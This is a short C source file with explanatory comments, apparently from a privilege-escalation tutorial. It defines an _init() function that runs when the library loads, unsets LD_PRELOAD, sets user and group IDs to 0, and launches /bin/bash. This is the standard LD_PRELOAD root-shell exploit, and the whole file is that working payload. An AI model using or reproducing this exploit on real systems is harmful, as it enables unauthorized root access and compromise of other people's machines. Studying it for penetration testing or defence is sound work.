#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
//"_init()". This function is a special function in C that is automatically executed when a shared library is loaded by the operating system.
void _init() {
unsetenv("LD_PRELOAD"); //The function starts by unsetting the "LD_PRELOAD" environment variable, which as we talked before, allows the user to preload shared libraries at runtime.
setgid(0);
setuid(0);
system("/bin/bash");
} 